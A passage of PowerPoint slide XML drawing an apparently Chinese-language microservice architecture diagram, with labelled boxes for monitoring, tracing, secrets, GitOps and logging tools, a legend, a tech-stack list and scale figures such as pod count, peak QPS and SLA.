          <a:xfrm>
            <a:off x="1996035" y="5299159"/>
            <a:ext cx="737274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6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Grafana</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="248" name="Shape 246"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2859186" y="4993460"/>
            <a:ext cx="773239" cy="413593"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="002840"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A5878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2859186" y="5029425"/>
            <a:ext cx="773239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750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="250" name="Text 248"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2877168" y="5182274"/>
            <a:ext cx="737274" cy="116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Jaeger</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="251" name="Text 249"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2877168" y="5299159"/>
            <a:ext cx="737274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6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链路追踪</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="252" name="Shape 250"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3740319" y="4993460"/>
            <a:ext cx="773239" cy="413593"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="002840"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A5878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3740319" y="5029425"/>
            <a:ext cx="773239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750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="254" name="Text 252"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3758301" y="5182274"/>
            <a:ext cx="737274" cy="116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Vault</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="255" name="Text 253"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3758301" y="5299159"/>
            <a:ext cx="737274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6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密钥管理</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="256" name="Shape 254"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4621451" y="4993460"/>
            <a:ext cx="773239" cy="413593"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="002840"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A5878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4621451" y="5029425"/>
            <a:ext cx="773239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🚀</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="258" name="Text 256"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4639434" y="5182274"/>
            <a:ext cx="737274" cy="116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ArgoCD</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="259" name="Text 257"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4639434" y="5299159"/>
            <a:ext cx="737274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6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CI/CD GitOps</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="260" name="Shape 258"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5502584" y="4993460"/>
            <a:ext cx="773239" cy="413593"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="002840"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A5878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5502584" y="5029425"/>
            <a:ext cx="773239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750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="262" name="Text 260"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5520566" y="5182274"/>
            <a:ext cx="737274" cy="116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ELK Stack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="263" name="Text 261"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5520566" y="5299159"/>
            <a:ext cx="737274" cy="89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6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日志管理</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="264" name="Shape 262"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="660850" y="1522876"/>
            <a:ext cx="8991" cy="98903"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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665345" y="1617283"/>
            <a:ext cx="818195" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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1479044" y="1621779"/>
            <a:ext cx="8991" cy="98903"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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1559965" y="1522876"/>
            <a:ext cx="8991" cy="98903"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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1483540" y="1617283"/>
            <a:ext cx="80920" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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1479044" y="1621779"/>
            <a:ext cx="8991" cy="98903"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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2459080" y="1522876"/>
            <a:ext cx="8991" cy="98903"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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1483540" y="1617283"/>
            <a:ext cx="980035" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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1479044" y="1621779"/>
            <a:ext cx="8991" cy="98903"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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3358195" y="1522876"/>
            <a:ext cx="8991" cy="98903"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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1483540" y="1617283"/>
            <a:ext cx="1879150" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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1479044" y="1621779"/>
            <a:ext cx="8991" cy="98903"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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642867" y="2116292"/>
            <a:ext cx="8991" cy="143858"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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1470053" y="2116292"/>
            <a:ext cx="8991" cy="143858"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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2261274" y="2116292"/>
            <a:ext cx="8991" cy="143858"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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624885" y="2709708"/>
            <a:ext cx="8991" cy="323681"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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629381" y="3028894"/>
            <a:ext cx="53947" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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678832" y="3033389"/>
            <a:ext cx="8991" cy="323681"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5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1434088" y="2709708"/>
            <a:ext cx="8991" cy="323681"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00B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1438584" y="3028894"/>
            <a:ext cx="125876" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00B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1559965" y="3033389"/>
            <a:ext cx="8991" cy="323681"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00B4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4580991" y="2709708"/>
            <a:ext cx="8991" cy="647363"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8866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4234832" y="3352575"/>
            <a:ext cx="350655" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8866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4230336" y="3357071"/>
            <a:ext cx="8991" cy="647363"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8866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678832" y="3770664"/>
            <a:ext cx="8991" cy="233770"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5A5A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1559965" y="3770664"/>
            <a:ext cx="8991" cy="233770"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5A5A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7426690" y="911478"/>
            <a:ext cx="1636389" cy="5053027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="040C16"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="004890"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="291" name="Text 289"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7498619" y="983407"/>
            <a:ext cx="1492531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63" kern="0" spc="300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A7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LEGEND</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="292" name="Shape 290"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7498619" y="1127265"/>
            <a:ext cx="1492531" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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7516602" y="1199195"/>
            <a:ext cx="125876" cy="125876"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0050A0"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="00B4FF"/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7678442" y="1199195"/>
            <a:ext cx="1312708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核心节点</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="295" name="Shape 293"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7516602" y="1397000"/>
            <a:ext cx="125876" cy="125876"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001828"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="004890"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="296" name="Text 294"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7678442" y="1397000"/>
            <a:ext cx="1312708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标准微服务</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="297" name="Shape 295"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7516602" y="1594805"/>
            <a:ext cx="125876" cy="125876"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A1400"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="FF8C00"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="298" name="Text 296"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7678442" y="1594805"/>
            <a:ext cx="1312708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AI/关键节点</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="299" name="Shape 297"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7516602" y="1792611"/>
            <a:ext cx="125876" cy="125876"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="002840"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A5878"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="300" name="Text 298"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7678442" y="1792611"/>
            <a:ext cx="1312708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8C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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="301" name="Shape 299"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7498619" y="2062345"/>
            <a:ext cx="1492531" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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2" name="Text 300"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7498619" y="2116292"/>
            <a:ext cx="1492531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kern="0" spc="200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A7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 STACK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="303" name="Text 301"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7516602" y="2260150"/>
            <a:ext cx="1456566" cy="116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2A6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Runtime: Java/Go/Python/Node</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="304" name="Text 302"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7516602" y="2395018"/>
            <a:ext cx="1456566" cy="116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2A6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Mesh: Istio + Envoy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="305" name="Text 303"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7516602" y="2529885"/>
            <a:ext cx="1456566" cy="116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2A6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Cloud: AWS/阿里云混合</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="306" name="Text 304"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7516602" y="2664752"/>
            <a:ext cx="1456566" cy="116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2A6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Infra: K8s · Helm · GitOps</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="307" name="Text 305"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7516602" y="2799619"/>
            <a:ext cx="1456566" cy="116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2A6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Observ: Prometheus+Grafana</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="308" name="Text 306"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7516602" y="2934487"/>
            <a:ext cx="1456566" cy="116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2A60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Security: OAuth2 · JWT · mTLS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="309" name="Shape 307"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7498619" y="3114310"/>
            <a:ext cx="1492531" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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0" name="Text 308"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7516602" y="3177248"/>
            <a:ext cx="1456566" cy="43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563" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007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Scale: 200+ pods</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="563" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007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QPS: 80,000+ peak</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="563" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007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SLA: 99.99%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="311" name="Shape 309"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7498619" y="3680752"/>
            <a:ext cx="1492531" cy="449558"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0800"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="663300"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="312" name="Text 310"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534584" y="3716717"/>
            <a:ext cx="1420602" cy="377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563" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC66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AI推理服务为新增节点，Q2完成压测</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="313" name="Shape 311"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6054416"/>
            <a:ext cx="9144000" cy="431575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0814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0" y="6054416"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0078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1258761" y="6108363"/>
            <a:ext cx="8991" cy="251752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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2517522" y="6108363"/>
            <a:ext cx="8991" cy="251752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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3776283" y="6108363"/>
            <a:ext cx="8991" cy="251752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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5035044" y="6108363"/>
            <a:ext cx="8991" cy="251752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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6293805" y="6108363"/>
            <a:ext cx="8991" cy="251752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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0" name="Text 318"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="143858" y="6081389"/>
            <a:ext cx="1222796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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A7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服务数量</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="321" name="Text 319"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="143858" y="6189283"/>
            <a:ext cx="1222796" cy="197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007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75" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="322" name="Text 320"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1402619" y="6081389"/>
            <a:ext cx="1222796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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A7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K8s Pod数</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="323" name="Text 321"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1402619" y="6189283"/>
            <a:ext cx="1222796" cy="197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007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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="324" name="Text 322"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2661381" y="6081389"/>
            <a:ext cx="1222796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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A7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峰値QPS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="325" name="Text 323"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2661381" y="6189283"/>
            <a:ext cx="1222796" cy="197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007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80K</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="326" name="Text 324"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="6081389"/>
            <a:ext cx="1222796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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A7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系绿SLA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="327" name="Text 325"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3920142" y="6189283"/>
            <a:ext cx="1222796" cy="197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007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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="328" name="Text 326"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5358726" y="6081389"/>
            <a:ext cx="1222796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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A7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架构层级</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="329" name="Text 327"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5358726" y="6189283"/>
            <a:ext cx="1222796" cy="197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007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Layer</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="330" name="Text 328"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6797310" y="6081389"/>
            <a:ext cx="1222796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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A7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架构版本</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="331" name="Text 329"/>
          <p:cNvSpPr/>
